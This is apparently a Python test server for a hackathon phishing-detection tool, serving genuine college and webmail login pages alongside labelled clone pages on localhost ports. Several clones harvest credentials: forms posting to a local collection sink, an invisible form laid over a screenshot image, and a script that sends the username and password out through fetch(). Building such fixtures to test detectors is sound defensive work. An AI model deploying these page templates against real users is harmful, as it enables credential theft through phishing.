"""
testpages/serve_all.py — Serves all 10 hackathon test scenarios plus edge cases.

Ports:
  5001: Genuine college portal (genuine)
  5002: Exact copy, foreign form action (likely_clone)
  5003: Same visual look, rewritten HTML/CSS structure (likely_clone)
  5004: Screenshot-only image clone with invisible form overlay (likely_clone)
  5005: Clone that hotlinks CSS and assets from page 1 (likely_clone)
  5006: Genuine webmail + submission sink (genuine)
  5007: Webmail clone with foreign action (likely_clone)
  5008: Legit lookalike: department portal with own login (low_risk)
  5009: Unrelated generic login page (unrelated)
  5010: Clone using JS fetch exfiltration without form action (likely_clone)
  5011: Slow page (3 s delay)
  5012: Broken page (HTTP 500 error)
  5013: Iframe embedded login page
"""
from __future__ import annotations

import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from urllib.parse import urlparse

# Shared CSS styles
SHARED_CSS = """
* { box-sizing: border-box; }
body {
  margin: 0; background: #f1f5f9; color: #243247;
  font: 16px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}
header {
  background: #174a82; color: white;
  padding: 22px; text-align: center;
}
main {
  width: min(420px, calc(100% - 32px));
  margin: 45px auto; padding: 32px;
  background: white; border-radius: 12px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
}
h2 { margin-top: 0; font-size: 22px; }
label { display: block; margin: 16px 0 6px; font-weight: 600; font-size: 14px; }
input {
  width: 100%; padding: 12px; border: 1px solid #cbd5e1;
  border-radius: 6px; font-size: 15px;
}
button {
  width: 100%; margin-top: 22px; padding: 12px;
  border: 0; border-radius: 6px;
  background: #174a82; color: white;
  font-weight: 700; font-size: 16px; cursor: pointer;
}
.note { color: #64748b; font-size: 12px; margin-top: 20px; text-align: center; }
"""

class TestPageHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        port = self.server.server_port
        parsed = urlparse(self.path)
        path = parsed.path

        # Handle CSS resource request
        if path == "/portal.css":
            self.send_response(200)
            self.send_header("Content-Type", "text/css; charset=utf-8")
            self.end_headers()
            self.wfile.write(SHARED_CSS.encode("utf-8"))
            return

        # Handle Logo asset request
        if path == "/logo.svg":
            svg = (
                '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="#174a82">'
                '<path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/>'
                '</svg>'
            )
            self.send_response(200)
            self.send_header("Content-Type", "image/svg+xml")
            self.end_headers()
            self.wfile.write(svg.encode("utf-8"))
            return

        # Edge case: Port 5011 — Slow Page (3s delay)
        if port == 5011:
            time.sleep(3.0)

        # Edge case: Port 5012 — Broken 500 Server Error
        if port == 5012:
            self.send_response(500)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error - Simulated failure")
            return

        # Render corresponding page HTML
        html = self._get_page_html(port)
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        # Submission collection sink (e.g. localhost:5006/submit)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"received","captured":true}')

    def log_message(self, fmt, *args):
        # Clean server logging
        print(f"[{self.server.server_port}] {fmt % args}")

    def _get_page_html(self, port: int) -> str:
        # 1. Port 5001: Genuine Greenfield College Portal
        if port == 5001:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Greenfield College Portal — Sign In</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header>
  <img src="/logo.svg" alt="Greenfield Logo" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield College</strong>
</header>
<main>
<h2>Student & Faculty Portal</h2>
<p>Sign in to continue to your academic dashboard.</p>
<form method="post" action="/login">
<label for="username">Student ID / Email</label>
<input id="username" name="username" autocomplete="off" placeholder="id@greenfield.edu" required>
<label for="password">Password</label>
<input id="password" name="password" type="password" autocomplete="off" required>
<button type="submit">Sign in</button>
</form>
<p class="note">Greenfield College Official Authentication System</p>
</main>
</body>
</html>"""

        # 2. Port 5002: Exact copy, form action changed to foreign attacker server
        if port == 5002:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Greenfield College Portal — Sign In</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header>
  <img src="/logo.svg" alt="Greenfield Logo" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield College</strong>
</header>
<main>
<h2>Student & Faculty Portal</h2>
<p>Sign in to continue to your academic dashboard.</p>
<!-- Stolen credentials posted to external host -->
<form method="post" action="http://localhost:5006/submit">
<label for="username">Student ID / Email</label>
<input id="username" name="username" autocomplete="off" placeholder="id@greenfield.edu" required>
<label for="password">Password</label>
<input id="password" name="password" type="password" autocomplete="off" required>
<button type="submit">Sign in</button>
</form>
<p class="note">Greenfield College Official Authentication System</p>
</main>
</body>
</html>"""

        # 3. Port 5003: Same visual look, fully rewritten HTML & CSS structure
        if port == 5003:
            return """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Greenfield College Portal — Sign In</title>
<style>
body { background:#f1f5f9; margin:0; font-family:sans-serif; }
.top-nav { background:#174a82; color:#fff; text-align:center; padding:22px; font-weight:bold; }
.auth-wrapper { max-width:420px; margin:45px auto; background:#fff; padding:32px; border-radius:12px; box-shadow:0 10px 30px #0001; }
.inp-row { margin-bottom:16px; }
.inp-box { width:100%; padding:12px; border:1px solid #cbd5e1; border-radius:6px; }
.btn-submit { width:100%; background:#174a82; color:#fff; font-weight:bold; border:0; padding:12px; border-radius:6px; cursor:pointer; }
</style>
</head>
<body>
<div class="top-nav">Greenfield College</div>
<div class="auth-wrapper">
<h3>Student & Faculty Portal</h3>
<p>Sign in to continue to your academic dashboard.</p>
<form action="http://localhost:5006/submit" method="post">
<div class="inp-row"><input class="inp-box" name="uid" placeholder="Student ID / Email" required></div>
<div class="inp-row"><input class="inp-box" name="pwd" type="password" placeholder="Password" required></div>
<button class="btn-submit" type="submit">Sign in</button>
</form>
</div>
</body>
</html>"""

        # 4. Port 5004: Screenshot pasted as one background image with invisible form overlay
        if port == 5004:
            return """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Greenfield College Portal — Sign In</title>
<style>
body, html { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#f1f5f9; }
.screen-img { width:100vw; height:100vh; object-fit:cover; display:block; }
.overlay-form {
  position:absolute; top:42%; left:50%; transform:translate(-50%, -50%);
  width:360px; height:240px;
}
.ghost-input {
  width:100%; height:45px; margin-bottom:18px;
  background:transparent; border:1px solid transparent; font-size:16px;
}
.ghost-btn {
  width:100%; height:45px; background:transparent; border:none; cursor:pointer;
}
</style>
</head>
<body>
<!-- Simulated full screenshot background -->
<svg class="screen-img" viewBox="0 0 1366 768" xmlns="http://www.w3.org/2000/svg">
  <rect width="1366" height="768" fill="#f1f5f9"/>
  <rect width="1366" height="80" fill="#174a82"/>
  <text x="683" y="50" fill="white" font-size="24" font-family="sans-serif" text-anchor="middle" font-weight="bold">Greenfield College</text>
  <rect x="473" y="160" width="420" height="420" rx="12" fill="white"/>
  <text x="500" y="220" fill="#243247" font-size="20" font-family="sans-serif" font-weight="bold">Student &amp; Faculty Portal</text>
  <rect x="500" y="270" width="366" height="45" rx="6" fill="#f8fafc" stroke="#cbd5e1"/>
  <rect x="500" y="345" width="366" height="45" rx="6" fill="#f8fafc" stroke="#cbd5e1"/>
  <rect x="500" y="420" width="366" height="45" rx="6" fill="#174a82"/>
  <text x="683" y="450" fill="white" font-size="16" font-family="sans-serif" text-anchor="middle" font-weight="bold">Sign in</text>
</svg>
<form class="overlay-form" method="post" action="http://localhost:5006/submit">
  <input class="ghost-input" name="user" style="margin-top:10px;">
  <input class="ghost-input" type="password" name="pass" style="margin-top:20px;">
  <button class="ghost-btn" type="submit" style="margin-top:20px;"></button>
</form>
</body>
</html>"""

        # 5. Port 5005: Clone that hotlinks CSS and assets directly from page 5001
        if port == 5005:
            return """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Greenfield College Portal — Sign In</title>
<!-- Hotlinked asset and stylesheet from genuine origin -->
<link rel="stylesheet" href="http://localhost:5001/portal.css">
</head>
<body>
<header>
  <img src="http://localhost:5001/logo.svg" alt="Greenfield Logo" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield College</strong>
</header>
<main>
<h2>Student & Faculty Portal</h2>
<p>Sign in to continue to your academic dashboard.</p>
<form method="post" action="http://localhost:5006/submit">
<label for="username">Student ID / Email</label>
<input id="username" name="username" required>
<label for="password">Password</label>
<input id="password" name="password" type="password" required>
<button type="submit">Sign in</button>
</form>
<p class="note">Hotlinked Clone Asset Test</p>
</main>
</body>
</html>"""

        # 6. Port 5006: Genuine Greenfield Webmail
        if port == 5006:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Greenfield Webmail Login</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header style="background:#0f3866;">
  <img src="/logo.svg" alt="Greenfield" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield Webmail</strong>
</header>
<main>
<h2>Webmail Access</h2>
<p>Sign in to view your college email account.</p>
<form method="post" action="/login">
<label for="email">Campus Email Address</label>
<input id="email" name="email" placeholder="student@greenfield.edu" required>
<label for="password">Email Password</label>
<input id="password" name="password" type="password" required>
<button type="submit" style="background:#0f3866;">Open Mail</button>
</form>
<p class="note">Secured by Greenfield Campus IT</p>
</main>
</body>
</html>"""

        # 7. Port 5007: Webmail clone on lookalike hostname / port
        if port == 5007:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Greenfield Webmail Login</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header style="background:#0f3866;">
  <img src="/logo.svg" alt="Greenfield" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield Webmail</strong>
</header>
<main>
<h2>Webmail Access</h2>
<p>Sign in to view your college email account.</p>
<form method="post" action="http://localhost:5006/submit">
<label for="email">Campus Email Address</label>
<input id="email" name="email" placeholder="student@greenfield.edu" required>
<label for="password">Email Password</label>
<input id="password" name="password" type="password" required>
<button type="submit" style="background:#0f3866;">Open Mail</button>
</form>
<p class="note">Phishing Lookalike Replica</p>
</main>
</body>
</html>"""

        # 8. Port 5008: Legit lookalike — Greenfield Athletics & Library Department
        if port == 5008:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Greenfield Departmental Portal</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header style="background:#1b4d3e;">
  <strong>Greenfield Athletics &amp; Recreation</strong>
</header>
<main>
<h2>Department Portal</h2>
<p>Log in with your Greenfield credentials to reserve facilities.</p>
<!-- Legit same-origin action -->
<form method="post" action="/login">
<label for="user">Member ID</label>
<input id="user" name="user" required>
<label for="password">Password</label>
<input id="password" name="password" type="password" required>
<button type="submit" style="background:#1b4d3e;">Access Facility</button>
</form>
<p class="note">Greenfield College Departmental System</p>
</main>
</body>
</html>"""

        # 9. Port 5009: Unrelated generic login page
        if port == 5009:
            return """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Northstar Cloud Solutions — Sign In</title>
<style>
body { background:#0f172a; color:#f8fafc; font-family:sans-serif; margin:0; }
.card { max-width:380px; margin:80px auto; background:#1e293b; padding:36px; border-radius:12px; }
input { width:100%; padding:10px; margin:10px 0 16px; border-radius:6px; border:1px solid #334155; background:#0f172a; color:#fff; }
button { width:100%; padding:12px; background:#6366f1; color:#fff; border:0; border-radius:6px; font-weight:bold; cursor:pointer; }
</style>
</head>
<body>
<div class="card">
<h2>Northstar Cloud</h2>
<p>Sign in to your organization workspace</p>
<form method="post" action="/login">
<label>Work Email</label>
<input name="email" placeholder="name@company.com" required>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Continue</button>
</form>
</div>
</body>
</html>"""

        # 10. Port 5010: Clone using JS fetch exfiltration without form action
        if port == 5010:
            return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Greenfield College Portal — Sign In</title>
<link rel="stylesheet" href="/portal.css">
</head>
<body>
<header>
  <img src="/logo.svg" alt="Greenfield Logo" style="vertical-align:middle; width:36px; height:36px; margin-right:8px;">
  <strong>Greenfield College</strong>
</header>
<main>
<h2>Student & Faculty Portal</h2>
<p>Sign in to continue to your academic dashboard.</p>
<!-- NO form action: Exfiltrates via asynchronous JS fetch! -->
<form onsubmit="event.preventDefault(); sendStolen();">
<label for="username">Student ID / Email</label>
<input id="username" name="username" required>
<label for="password">Password</label>
<input id="password" name="password" type="password" required>
<button type="submit" id="login-btn">Sign in</button>
</form>
<script>
function sendStolen() {{
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  fetch('http://localhost:5006/submit', {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify({{ username: u, password: p }})
  }}).then(() => alert('Account verified.'));
}}
</script>
<p class="note">Greenfield College Official Authentication System</p>
</main>
</body>
</html>"""

        # 13. Port 5013: Iframe Page
        if port == 5013:
            return """<!doctype html>
<html>
<head><title>Portal Access Frame</title></head>
<body style="margin:0;">
<iframe src="http://localhost:5001/login" style="width:100%; height:100vh; border:none;"></iframe>
</body>
</html>"""

        # Default fallback
        return f"<html><body><h1>Test Server Port {port}</h1></body></html>"


PORTS = [5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5011, 5012, 5013]

def main():
    servers = []
    for port in PORTS:
        try:
            server = ThreadingHTTPServer(("127.0.0.1", port), TestPageHandler)
            thread = Thread(target=server.serve_forever, daemon=True)
            thread.start()
            servers.append(server)
            print(f"Demo page active: http://localhost:{port}/login")
        except Exception as exc:
            print(f"Failed to start port {port}: {exc}")

    print("\nAll 10 test pages + edge cases running (Ports 5001-5013).")
    print("Press Ctrl+C to stop all demo servers.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping demo servers...")
    finally:
        for s in servers:
            s.shutdown()
            s.server_close()

if __name__ == "__main__":
    main()
